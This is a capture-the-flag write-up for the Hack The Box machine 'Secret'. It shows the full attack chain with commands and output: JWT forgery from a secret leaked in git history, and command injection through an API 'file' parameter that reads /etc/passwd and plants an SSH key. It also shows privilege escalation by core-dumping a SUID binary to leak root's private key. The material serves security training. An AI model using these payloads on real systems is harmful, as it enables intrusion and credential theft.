# Secret

# Nmap

Let’s start performing a full port scan on host.

```bash
─[us-dedivip-1]─[10.10.16.23]─[th3g3ntl3m4n@htb]─[~/htb/Secret]
└──╼ [★]$ sudo nmap -v -sS -Pn -p- --min-rate=300 --max-rate=500 10.10.11.120

Host is up (0.36s latency).
Not shown: 65532 closed tcp ports (reset)
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
3000/tcp open  ppp
```

Now, let’s running a detailed versioned port scan on the open ports that was found.

```bash
─[us-dedivip-1]─[10.10.16.23]─[th3g3ntl3m4n@htb]─[~/htb/Secret]
└──╼ [★]$ sudo nmap -vv -A -Pn -p 22,80,3000 -oA nmap/secret 10.10.11.120

PORT     STATE SERVICE REASON         VERSION                                                                                                                                                 
22/tcp   open  ssh     syn-ack ttl 63 OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)                                                                                            
| ssh-hostkey:                                                                                                                                                                                
|   3072 97:af:61:44:10:89:b9:53:f0:80:3f:d7:19:b1:e2:9c (RSA)                                                                                                                                
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDBjDFc+UtqNVYIrxJx+2Z9ZGi7LtoV6vkWkbALvRXmFzqStfJ3UM7TuOcZcPd82vk0gFVN2/wjA3LUlbUlr7oSlD15DdJkr/XjYrZLJnG4NCxcAnbB5CIRaWmrrdGy5pJ/KgKr4UEVGDK+oAgE7wbv
++el2WeD1DF8gw+GIHhtjrK1s0nfyNGcmGOwx8crtHB4xLpopAxWDr2jzMFMdGcIzZMRVLbe+TsG/8O/GFgNXU1WqFYGe4xl+MCmomjh9mUspf1WP2SRZ7V0kndJJxtRBTw6V+NQ/7EJYJPMeugOtbputyZMH+jALhzxBs07JLbw8Bh9JX+ZJl/j6VcIDf
FRXxB7ceSe/cp4UYWcLqN+AsoE7k+uMCV6vmXYPNC3g5xfMMrDfVmGmrPbop0oPZUB3kr8iz5CI/qM61WI07/MME1uyM352WZHAJmeBLPAOy05ZBY+DgpVElkr0vVa+3UyKsF1dC3Qm2jisx/qh3sGauv1R8oXGHvy0+oeMOlJN+k=                
|   256 95:ed:65:8d:cd:08:2b:55:dd:17:51:31:1e:3e:18:12 (ECDSA)                                                                                                                               
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBOL9rRkuTBwrdKEa+8VrwUjloHdmUdDR87hBOczK1zpwrsV/lXE1L/bYvDMUDVD0jE/aqMhekqNfBimt8aX53O0=                            
|   256 33:7b:c1:71:d3:33:0f:92:4e:83:5a:1f:52:02:93:5e (ED25519)                                                                                                                             
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAINM1K8Yufj5FJnBjvDzcr+32BQ9R/2lS/Mu33ExJwsci                                                                                                            
80/tcp   open  http    syn-ack ttl 63 nginx 1.18.0 (Ubuntu)                                                                                                                                   
|_http-server-header: nginx/1.18.0 (Ubuntu)                                                                                                                                                   
|_http-title: DUMB Docs                                                                                                                                                                       
| http-methods:                                                                                                                                                                               
|_  Supported Methods: GET HEAD POST OPTIONS                                                                                                                                                  
3000/tcp open  http    syn-ack ttl 63 Node.js (Express middleware)                                                                                                                            
|_http-title: DUMB Docs                                                                                                                                                                       
| http-methods:                                                                                                                                                                               
|_  Supported Methods: GET HEAD POST OPTIONS                                                                                                                                                  
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port                                                                                         
OS fingerprint not ideal because: Missing a closed TCP port so results incomplete                                                                                                             
Aggressive OS guesses: Linux 4.15 - 5.6 (95%), Linux 5.3 - 5.4 (95%), Linux 2.6.32 (95%), Linux 5.0 - 5.3 (95%), Linux 3.1 (95%), Linux 3.2 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.
17) (94%), ASUS RT-N56U WAP (Linux 3.4) (93%), Linux 3.16 (93%), Linux 5.0 - 5.4 (93%)                                                                                                        
No exact OS matches for host (test conditions non-ideal).
```

# Enumeration

After finished our port scan, we’ve got the open ports 22, 80, 3000. Let’s access the webpage on our browser.

![Untitled](images/Untitled.png)

When we explore the website, we’ll let a brute-force directory running in background.

```bash
─[us-dedivip-1]─[10.10.16.23]─[th3g3ntl3m4n@htb]─[~/htb/Secret]
└──╼ [★]$ gobuster dir -e -u "http://secret.htb/" -w "/opt/SecLists/Discovery/Web-Content/raft-large-directories.txt" -t 50 -x txt,js,json -o gobuster/secret

http://secret.htb/download             (Status: 301) [Size: 183] [--> /download/]
http://secret.htb/docs                 (Status: 200) [Size: 20720]               
http://secret.htb/api                  (Status: 200) [Size: 93]                  
http://secret.htb/assets               (Status: 301) [Size: 179] [--> /assets/]  
```

Accessing the webservice running on port 3000, we’ve got.

![Untitled](images/Untitled%201.png)

Let’s perform a brute-force directories on this URL.

```bash
─[us-dedivip-1]─[10.10.16.23]─[th3g3ntl3m4n@htb]─[~/htb/Secret]
└──╼ [★]$ gobuster dir -e -u "http://secret.htb:3000/" -w "/opt/SecLists/Discovery/Web-Content/raft-large-directories.txt" -t 50 -x .txt,.php,.js,.yaml,.json -o gobuster/secret_3000

http://secret.htb:3000/download             (Status: 301) [Size: 183] [--> /download/]
http://secret.htb:3000/api                  (Status: 200) [Size: 93]                  
http://secret.htb:3000/assets               (Status: 301) [Size: 179] [--> /assets/]  
http://secret.htb:3000/docs                 (Status: 200) [Size: 20720]               
http://secret.htb:3000/API                  (Status: 200) [Size: 93]                  
http://secret.htb:3000/Docs                 (Status: 200) [Size: 20720]               
http://secret.htb:3000/Api                  (Status: 200) [Size: 93]                  
http://secret.htb:3000/DOCS                 (Status: 200) [Size: 20720]
```

Now, let’s brute-force directories from `/api` .

```bash
─[us-dedivip-1]─[10.10.16.23]─[th3g3ntl3m4n@htb]─[~/htb/images/exploitation]
└──╼ [★]$ gobuster dir -e -u "http://secret.htb:3000/api/" -w "/opt/SecLists/Discovery/Web-Content/raft-small-words.txt" -t 50 -o ../gobuster/secret_3000-api --wildcard | grep -v "Status: 200"

http://secret.htb:3000/api/logs                 (Status: 401) [Size: 13]
http://secret.htb:3000/api/Logs                 (Status: 401) [Size: 13]
http://secret.htb:3000/api/priv                 (Status: 401) [Size: 13]
http://secret.htb:3000/api/LOGS                 (Status: 401) [Size: 13]
```

Let’s brute-force `/logs` in order to verify some entry point.

```bash
─[us-dedivip-1]─[10.10.16.23]─[th3g3ntl3m4n@htb]─[~/htb/images/exploitation]
└──╼ [★]$ gobuster dir -e -u "http://secret.htb:3000/api/logs/" -w "/opt/SecLists/Discovery/Web-Content/raft-small-words.txt" -t 50 -o ../gobuster/secret_3000-api-logs --wildcard | grep -v "Status: 200"
```

Reading the source code on route/private.js we’ve found a possibly entry point where there is a RCE vulnerability.

```bash
if (name == 'theadmin'){
        const getLogs = `git log --oneline ${file}`;
        exec(getLogs, (err , output) =>{
            if(err){
                res.status(500).send(err);
                return
            }
            res.json(output);
        })
    }
```

On both webpages, we’ve noticed there is a button where we can download the source code of them API.

![Untitled](images/Untitled%202.png)

Downloading the source code, we’ve got access a `.git` directory.  Inspect this folder, using the command `git show` we’ve got.

```bash
─[us-dedivip-1]─[10.10.16.23]─[th3g3ntl3m4n@htb]─[~/htb/images/local-web/.git]
└──╼ [★]$ git show

commit e297a2797a5f62b6011654cf6fb6ccb6712d2d5b (HEAD -> master)
Author: dasithsv <dasithsv@gmail.com>
Date:   Thu Sep 9 00:03:27 2021 +0530

    now we can view logs from server 😃

diff --git a/routes/private.js b/routes/private.js
index 1347e8c..cf6bf21 100644
--- a/routes/private.js
+++ b/routes/private.js
@@ -11,10 +11,10 @@ router.get('/priv', verifytoken, (req, res) => {
     
     if (name == 'theadmin'){
         res.json({
-            role:{
-
-                role:"you are admin", 
-                desc : "{flag will be here}"
+            creds:{
+                role:"admin", 
+                username:"theadmin",
+                desc : "welcome back admin,"
             }
         })
     }
@@ -26,7 +26,32 @@ router.get('/priv', verifytoken, (req, res) => {
             }
         })
     }
+})
+
 
+router.get('/logs', verifytoken, (req, res) => {
+    const file = req.query.file;
+    const userinfo = { name: req.user }
+    const name = userinfo.name.name;
+    
+    if (name == 'theadmin'){
+        const getLogs = `git log --oneline ${file}`;
+        exec(getLogs, (err , output) =>{
+            if(err){
+                res.status(500).send(err);
+                return
+            }
+            res.json(output);
+        })
+    }
+    else{
+        res.json({
+            role: {
+                role: "you are normal user",
+                desc: userinfo.name.name
+            }
+        })
+    }
 })
 
 router.use(function (req, res, next) {
@@ -40,4 +65,4 @@ router.use(function (req, res, next) {
 });
 
 
-module.exports = router
\ No newline at end of file
+module.exports = router
(END)
```

In this folder also we’ve check the content of `.env` file.

```bash
─[us-dedivip-1]─[10.10.16.23]─[th3g3ntl3m4n@htb]─[~/htb/images/local-web]
└──╼ [★]$ cat .env 
DB_CONNECT = 'mongodb://127.0.0.1:27017/auth-web'
TOKEN_SECRET = secret
```

Now we know that the app use Mongo DB locally and there’s a secret token.

Let’s use GitTools [https://github.com/internetwache/GitTools](https://github.com/internetwache/GitTools) in order to get the history of commits. Here we are looking for the secret token in this file `.env`.

```bash
─[us-dedivip-1]─[10.10.16.23]─[th3g3ntl3m4n@htb]─[~/htb/images/local-web/.git]
└──╼ [★]$ /opt/GitTools/Extractor/extractor.sh ../ ../local-web-git

...
[+] Found file: /home/th3g3ntl3m4n/htb/images/local-web/.git/../local-web-git/5-4e5547295cfe456d8ca7005cb823e1101fd1f9cb/public/assets/fontawesome/svgs/solid/map-pin.svg                
[+] Found file: /home/th3g3ntl3m4n/htb/images/local-web/.git/../local-web-git/5-4e5547295cfe456d8ca7005cb823e1101fd1f9cb/public/assets/fontawesome/svgs/solid/map-signs.svg            
[+] Found file: /home/th3g3ntl3m4n/htb/images/local-web/.git/../local-web-git/5-4e5547295cfe456d8ca7005cb823e1101fd1f9cb/public/assets/fontawesome/svgs/solid/map.svg             
[+] Found file: /home/th3g3ntl3m4n/htb/images/local-web/.git/../local-web-git/5-4e5547295cfe456d8ca7005cb823e1101fd1f9cb/public/assets/fontawesome/svgs/solid/marker.svg            
[+] Found file: /home/th3g3ntl3m4n/htb/images/local-web/.git/../local-web-git/5-4e5547295cfe456d8ca7005cb823e1101fd1f9cb/public/assets/fontawesome/svgs/solid/mars-double.svg    
[+] Found file: /home/th3g3ntl3m4n/htb/images/local-web/.git/../local-web-git/5-4e5547295cfe456d8ca7005cb823e1101fd1f9cb/public/assets/fontawesome/svgs/solid/mars-stroke-h.svg     
[+] Found file: /home/th3g3ntl3m4n/htb/images/local-web/.git/../local-web-git/5-4e5547295cfe456d8ca7005cb823e1101fd1f9cb/public/assets/fontawesome/svgs/solid/mars-stroke-v.svg    
[+] Found file: /home/th3g3ntl3m4n/htb/images/local-web/.git/../local-web-git/5-4e5547295cfe456d8ca7005cb823e1101fd1f9cb/public/assets/fontawesome/svgs/solid/mars-stroke.svg                 
[+] Found file: /home/th3g3ntl3m4n/htb/images/local-web/.git/../local-web-git/5-4e5547295cfe456d8ca7005cb823e1101fd1f9cb/public/assets/fontawesome/svgs/solid/mars.svg                        
[+] Found file: /home/th3g3ntl3m4n/htb/images/local-web/.git/../local-web-git/5-4e5547295cfe456d8ca7005cb823e1101fd1f9cb/public/assets/fontawesome/svgs/solid/mask.svg                        
[+] Found file: /home/th3g3ntl3m4n/htb/images/local-web/.git/../local-web-git/5-4e5547295cfe456d8ca7005cb823e1101fd1f9cb/public/assets/fontawesome/svgs/solid/medal.svg                       
[+] Found file: /home/th3g3ntl3m4n/htb/images/local-web/.git/../local-web-git/5-4e5547295cfe456d8ca7005cb823e1101fd1f9cb/public/assets/fontawesome/svgs/solid/medkit.svg
```

After executing the GitTool Extractor, we’ve gone to the folder that GitTool created.

```bash
─[us-dedivip-1]─[10.10.16.23]─[th3g3ntl3m4n@htb]─[~/htb/images/local-web/local-web-git]
└──╼ [★]$ ls -la
total 0
drwxr-xr-x 1 th3g3ntl3m4n th3g3ntl3m4n 504 Jan 21 17:20 .
drwxrwxr-x 1 th3g3ntl3m4n th3g3ntl3m4n 208 Jan 21 17:13 ..
drwxr-xr-x 1 th3g3ntl3m4n th3g3ntl3m4n 204 Jan 21 17:14 0-67d8da7a0e53d8fadeb6b36396d86cdcd4f6ec78
drwxr-xr-x 1 th3g3ntl3m4n th3g3ntl3m4n 220 Jan 21 17:16 1-55fe756a29268f9b4e786ae468952ca4a8df1bd8
drwxr-xr-x 1 th3g3ntl3m4n th3g3ntl3m4n 204 Jan 21 17:17 2-e297a2797a5f62b6011654cf6fb6ccb6712d2d5b
drwxr-xr-x 1 th3g3ntl3m4n th3g3ntl3m4n 204 Jan 21 17:19 3-de0a46b5107a2f4d26e348303e76d85ae4870934
drwxr-xr-x 1 th3g3ntl3m4n th3g3ntl3m4n 220 Jan 21 17:20 4-3a367e735ee76569664bf7754eaaade7c735d702
drwxr-xr-x 1 th3g3ntl3m4n th3g3ntl3m4n 204 Jan 21 17:22 5-4e5547295cfe456d8ca7005cb823e1101fd1f9cb
```

Accessing the last one directory, we’ve got the content of `.env` file referring to the commit.

```bash
─[us-dedivip-1]─[10.10.16.23]─[th3g3ntl3m4n@htb]─[~/htb/images/local-web/local-web-git]
└──╼ [★]$ cat 5-4e5547295cfe456d8ca7005cb823e1101fd1f9cb/.env 
DB_CONNECT = 'mongodb://127.0.0.1:27017/auth-web'
TOKEN_SECRET = gXr67TtoQL8TShUc8XYsK2HvsBYfyQSFCFZe4MQp7gRpFuMkKjcM72CNQN4fMfbZEKx4i7YiWuNAkmuTcdEriCMm9vPAYkhpwPTiuVwVhvwE
```

We’ve got the secret token. Let’s try generate a JWT token for the user `theadmin` . Before do that, we have to create a user on the app in order to get a “example” of JWT token authentication.

Creating a user is described on [http://secret.htb/docs](http://secret.htb/docs) which we found performing a brute-force directory previously.

![Untitled](images/Untitled%203.png)

Creating our jpfdevs user.

```bash
─[us-dedivip-1]─[10.10.16.23]─[th3g3ntl3m4n@htb]─[~/htb/images/exploitation]
└──╼ [★]$ curl -H "Content-Type: application/json" -X POST http://secret.htb:3000/api/user/register -d '{"name": "jpfdevs","email": "jpfdevs@cybersec.com","password": "H4ck3r@2021"}'
{"user":"jpfdevs"}
```

Let’s log into the app with the new user it has been created.

```bash
─[us-dedivip-1]─[10.10.16.23]─[th3g3ntl3m4n@htb]─[~/htb/images/exploitation]
└──╼ [★]$ curl -H "Content-Type: application/json" -X POST http://secret.htb:3000/api/user/login -d '{"email": "jpfdevs@cybersec.com","password": "H4ck3r@2021"}'

eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MWViMmMwM2JiY2NiMTA0NWU4NTcwZjIiLCJuYW1lIjoianBmZGV2cyIsImVtYWlsIjoianBmZGV2c0BjeWJlcnNlYy5jb20iLCJpYXQiOjE2NDI4MDIzNDZ9.yhmhnH6rjMlREf10VZlBCVmBQaswdg8arOx2XlZ6MQw
```

Let’s write down this JWT token on [jwt.io](http://jwt.io) page.

![Untitled](images/Untitled%204.png)

Modifying the name field and verifying the signature with secret token.

![Untitled](images/Untitled%205.png)

Our modified JWT Token.

```bash

eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MTkwMDg3YWYwM2VjMDA0NWVlNjg1M2YiLCJuYW1lIjoidGhlYWRtaW4iLCJlbWFpbCI6ImRydEBkYXNpdGgud29ya3MiLCJpYXQiOjE2MzY4Mjk2NDh9.ENKbUx
gLeuUXueEMn5DG_2LZUJemd11E842rQ1ekzLg
```

Now, let’s try to get RCE on the host.

```bash
─[us-dedivip-1]─[10.10.16.23]─[th3g3ntl3m4n@htb]─[~/htb/images/exploitation]                                                                                                                  
└──╼ [★]$ curl -i \                                                                                                                                                                           
  -H 'auth-token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MTkwMDg3YWYwM2VjMDA0NWVlNjg1M2YiLCJuYW1lIjoidGhlYWRtaW4iLCJlbWFpbCI6ImRydEBkYXNpdGgud29ya3MiLCJpYXQiOjE2MzY4Mjk2NDh9.ENKbUx
gLeuUXueEMn5DG_2LZUJemd11E842rQ1ekzLg' \                                                                                                                                                      
  'http://10.10.11.120/api/logs?file=index.js;id;cat+/etc/passwd' | sed 's/\\n/\n/g'

uid=1000(dasith) gid=1000(dasith) groups=1000(dasith)
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
syslog:x:104:110::/home/syslog:/usr/sbin/nologin
_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false
uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin
tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin
landscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:110:1::/var/cache/pollinate:/bin/false
usbmux:x:111:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
sshd:x:112:65534::/run/sshd:/usr/sbin/nologin
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
dasith:x:1000:1000:dasith:/home/dasith:/bin/bash
lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
mongodb:x:113:117::/var/lib/mongodb:/usr/sbin/nologin
```

We can execute commands as dasith. Let’s verify if exists the authorized_keys file on user home ssh folder.

```bash
─[us-dedivip-1]─[10.10.16.23]─[th3g3ntl3m4n@htb]─[~/htb/images/exploitation]
└──╼ [★]$ curl -i   -H 'auth-token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MTkwMDg3YWYwM2VjMDA0NWVlNjg1M2YiLCJuYW1lIjoidGhlYWRtaW4iLCJlbWFpbCI6ImRydEBkYXNpdGgud29ya3MiLCJpYXQiOjE2MzY4Mjk2NDh9.ENKbUxgLeuUXueEMn5DG_2LZUJemd11E842rQ1ekzLg'   'http://10.10.11.120/api/logs?file=index.js;id;cat+/home/dasith/.ssh/authorized_keys' | sed 's/\\n/\n/g'
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100   650  100   650    0     0    950      0 --:--:-- --:--:-- --:--:--   948
HTTP/1.1 200 OK
Server: nginx/1.18.0 (Ubuntu)
Date: Fri, 21 Jan 2022 23:10:48 GMT
Content-Type: application/json; charset=utf-8
Content-Length: 650
Connection: keep-alive
X-Powered-By: Express
ETag: W/"28a-n52Be/hWyIvc55Ovn8bFS7oPXrc"

"ab3e953 Added the codes
uid=1000(dasith) gid=1000(dasith) groups=1000(dasith)
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDmRNVHR4914RyoVfs8uSm1W4A9NiIYZlSm2VCgLBSrMKXq1/kAgEVmYTcYxxO4iZOY8rxYYTyjVwavmmm0YyMWGVMe7V8U64cyR9P/XnUmbSuVgCWGnP3lH4Hmgkx+Y7jFGa8KKOImLqMPiZEV64J3TBZI+KmLjdmZn38GCqmQLVP0rTJODmK6MKqNInUGsVfvVtvs69JiIGY8WP7oiIsZ+d9A77o9AzIwIBfOs0PK7qGO48RQkSnTkw/HrYZQeh4sVFtnQKjLqrQlgBD/ZwQvt/MDlMphCO3d/BQAf8KeKAVCXC/j+zTRUUCbwowrikbreHYP0Bpvn1UWpAGscEBoVWaS5/t25ZWTph1r/w/mCWvHUFyYk4Ek9dHjCT5Sy4u1GxJMiT9CF/0tWqUAa16bTVNndHSpFYaL3dEaUH5WaNpsgFf4mUQS3LoK3hyuf+6jnafmZXvrJBd2XQirLzsIWITXjsOJe/oKqf3ZZmL0bQRxk6ZvJ4DmqrWnJSMo0sM= marsh@desktop
```

Good, let’s write our public key on this file.

```bash
─[us-dedivip-1]─[10.10.16.23]─[th3g3ntl3m4n@htb]─[~/htb/images/exploitation]
└──╼ [★]$ curl -i -H 'auth-token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MTkwMDg3YWYwM2VjMDA0NWVlNjg1M2YiLCJuYW1lIjoidGhlYWRtaW4iLCJlbWFpbCI6ImRydEBkYXNpdGgud29ya3MiLCJpYXQiOjE2MzY4Mjk2NDh9.ENKbUxgLeuUXueEMn5DG_2LZUJemd11E842rQ1ekzLg' -G --data-urlencode "file=index.js; echo $PUBLIC_KEY >> /home/dasith/.ssh/authorized_keys" 'http://10.10.11.120/api/logs'
HTTP/1.1 200 OK
Server: nginx/1.18.0 (Ubuntu)
Date: Fri, 21 Jan 2022 23:19:23 GMT
Content-Type: application/json; charset=utf-8
Content-Length: 27
Connection: keep-alive
X-Powered-By: Express
ETag: W/"1b-pFfOEX46IRaNi6v8ztcwIwl9EF8"

"ab3e953 Added the codes\n"
```

Verifying if it really write correctly

```bash
─[us-dedivip-1]─[10.10.16.23]─[th3g3ntl3m4n@htb]─[~/htb/images/exploitation]
└──╼ [★]$ curl -i   -H 'auth-token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MTkwMDg3YWYwM2VjMDA0NWVlNjg1M2YiLCJuYW1lIjoidGhlYWRtaW4iLCJlbWFpbCI6ImRydEBkYXNpdGgud29ya3MiLCJpYXQiOjE2MzY4Mjk2NDh9.ENKbUxgLeuUXueEMn5DG_2LZUJemd11E842rQ1ekzLg'   'http://10.10.11.120/api/logs?file=index.js;id;cat+/home/dasith/.ssh/authorized_keys' | sed 's/\\n/\n/g'
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  1218  100  1218    0     0   1775      0 --:--:-- --:--:-- --:--:--  1859
HTTP/1.1 200 OK
Server: nginx/1.18.0 (Ubuntu)
Date: Fri, 21 Jan 2022 23:22:19 GMT
Content-Type: application/json; charset=utf-8
Content-Length: 1218
Connection: keep-alive
X-Powered-By: Express
ETag: W/"4c2-ZYasbjsERTaR3AUFogRU5/sMhBY"

"ab3e953 Added the codes
uid=1000(dasith) gid=1000(dasith) groups=1000(dasith)
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDmRNVHR4914RyoVfs8uSm1W4A9NiIYZlSm2VCgLBSrMKXq1/kAgEVmYTcYxxO4iZOY8rxYYTyjVwavmmm0YyMWGVMe7V8U64cyR9P/XnUmbSuVgCWGnP3lH4Hmgkx+Y7jFGa8KKOImLqMPiZEV64J3TBZI+KmLjdmZn38GCqmQLVP0rTJODmK6MKqNInUGsVfvVtvs69JiIGY8WP7oiIsZ+d9A77o9AzIwIBfOs0PK7qGO48RQkSnTkw/HrYZQeh4sVFtnQKjLqrQlgBD/ZwQvt/MDlMphCO3d/BQAf8KeKAVCXC/j+zTRUUCbwowrikbreHYP0Bpvn1UWpAGscEBoVWaS5/t25ZWTph1r/w/mCWvHUFyYk4Ek9dHjCT5Sy4u1GxJMiT9CF/0tWqUAa16bTVNndHSpFYaL3dEaUH5WaNpsgFf4mUQS3LoK3hyuf+6jnafmZXvrJBd2XQirLzsIWITXjsOJe/oKqf3ZZmL0bQRxk6ZvJ4DmqrWnJSMo0sM= marsh@desktop
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDA1x9wN8PmTl+2MkmGsVFR2Zo5lS/DuX5pv46SUM93vDV4VX348OI0eOwF1LgrVmdqaktsbSDtGHMdyeJvQdEKg9gaO3AfnLEsloGrpjQoTNn3lN101I3jD/wN5D3vrkN9lXjAQWxOeVGoj34xwiOBxfjDdNDvjfYjDl/0SeKVProD6B5VWM5D71dfeAS/oJfMxZLcoGpYWggpCyqs0z/jDAQr2fK2OUaFI6IjHfYkqvtubE9GrumbUJn31DFoNUIJpvttQEExqF+Dnka7ruc9cFATf+IItwZ6H7fzi3rSHs2xR6fso6wGTsQQHQ9STYSuVLwRo1Gp4X7DY8paG7UI/GwpOl47d5g5lJX9+ZwzOJYgju1iX6OEglH4N4A1f04bi1TEDlJJAd5C13tKZEdDG79PLB7up3Bj3CKB8tFVdoTT36e/aNvNtPVKZrZFTWSqMr37eBQj2fvOr5bWzugKhmbPOVs5w3f3sJOPR59C5GuiETkDag3NyrEw/sbjLB0= jpfguedes@htb
```

 Good.

```bash
─[us-dedivip-1]─[10.10.16.23]─[th3g3ntl3m4n@htb]─[~/htb/images/exploitation]
└──╼ [★]$ ssh dasith@secret.htb
The authenticity of host 'secret.htb (10.10.11.120)' can't be established.
ECDSA key fingerprint is SHA256:YNT38/psf6LrGXZJZYJVglUOKXjstxzWK5JJU7zzp3g.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added 'secret.htb,10.10.11.120' (ECDSA) to the list of known hosts.
Welcome to Ubuntu 20.04.3 LTS (GNU/Linux 5.4.0-89-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Fri 21 Jan 2022 11:23:42 PM UTC

  System load:  0.15              Processes:             208
  Usage of /:   52.7% of 8.79GB   Users logged in:       0
  Memory usage: 17%               IPv4 address for eth0: 10.10.11.120
  Swap usage:   0%

0 updates can be applied immediately.

The list of available updates is more than a week old.
To check for new updates run: sudo apt update
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings

Last login: Fri Jan 21 23:03:46 2022 from 10.10.14.138
dasith@secret:~$ id
uid=1000(dasith) gid=1000(dasith) groups=1000(dasith)
```

Searching around on the system, we’ve found a binary with SUID bit activated.

```bash
dasith@secret:~$ ls -la /opt
total 56
drwxr-xr-x  2 root root  4096 Oct  7 10:06 .
drwxr-xr-x 20 root root  4096 Oct  7 15:01 ..
-rw-r--r--  1 root root  3736 Oct  7 10:01 code.c
-rw-r--r--  1 root root 16384 Oct  7 10:01 .code.c.swp
-rwsr-xr-x  1 root root 17824 Oct  7 10:03 count
-rw-r--r--  1 root root  4622 Oct  7 10:04 valgrind.log
```

Checking the binary, it executes as following.

```bash
dasith@secret:/opt$ ./count 
Enter source file/directory name: /etc/passwd

Total characters = 1881
Total words      = 51
Total lines      = 36
Save results a file? [y/N]: N
```

# Privilege Escalation

Leveraging Core Dump. This is usually not enabled by default, but having valgrind file in the directory hints that way.

The plan is to execute the program, have it read the file into memory, and then purposefully crash the program. Causing a core dump will dump the contents of the applications memory to a file.

Run the application and access `/root/.ssh/id_rsa`. When the application asks to save the contents to a file, press CTRL + z to push the application in the background. Next, run ps to get the PID of the application.

The core dump files are located at /var/crashes, and they can be unpacked using apport-unpack to view the data.

```bash
dasith@secret:/opt$ ./count
Enter source file/directory name: /root/.ssh/id_rsa

Total characters = 2602
Total words      = 45
Total lines      = 39
Save results a file? [y/N]: ^Z
[1]+  Stopped                 ./count
dasith@secret:/opt$ ps
    PID TTY          TIME CMD
  31584 pts/1    00:00:00 bash
  31844 pts/1    00:00:00 count
  31846 pts/1    00:00:00 ps
dasith@secret:/opt$ kill -SIGSEGV 31844
dasith@secret:/opt$ fg
./count
Segmentation fault (core dumped)

dasith@secret:/opt$ ls -la /var/crash/
total 92
drwxrwxrwt  2 root   root    4096 Jan 22 01:49 .
drwxr-xr-x 14 root   root    4096 Aug 13 05:12 ..
-rw-r-----  1 root   root   27203 Oct  6 18:01 _opt_count.0.crash
-rw-r-----  1 dasith dasith 31532 Jan 22 01:49 _opt_count.1000.crash
-rw-r-----  1 root   root   24048 Oct  5 14:24 _opt_countzz.0.crash
dasith@secret:/opt$ apport-unpack /var/crash/_opt_count.1000.crash /tmp/crash-report
```

You can use less to view the core dump, but its a binary file and the data is hard to sift through. xxd would be a good option, but since we’re looking for the flag, using the strings command is the best call.

```bash
dasith@secret:/opt$ strings /tmp/crash-report/CoreDump

...

Total lines      = 39                                                                                                                                                                [139/804]
/root/.ssh/id_rsa                                                                                                                                                                             
-----BEGIN OPENSSH PRIVATE KEY-----                                                                                                                                                           
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn                                                                                                                        
NhAAAAAwEAAQAAAYEAn6zLlm7QOGGZytUCO3SNpR5vdDfxNzlfkUw4nMw/hFlpRPaKRbi3                                                                                                                        
KUZsBKygoOvzmhzWYcs413UDJqUMWs+o9Oweq0viwQ1QJmVwzvqFjFNSxzXEVojmoCePw+                                                                                                                        
